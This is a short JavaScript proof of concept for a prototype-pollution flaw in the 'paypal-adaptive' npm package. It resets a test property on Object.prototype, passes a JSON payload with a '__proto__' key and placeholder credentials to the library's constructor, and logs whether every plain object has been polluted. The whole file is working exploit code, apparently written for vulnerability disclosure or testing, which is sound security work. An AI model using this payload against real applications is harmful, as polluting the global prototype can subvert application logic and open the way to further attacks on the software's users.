var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const PayPal = require('paypal-adaptive');
const p = new PayPal(JSON.parse('{"__proto__": {"polluted": "yes"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"}'));
console.log({}.polluted);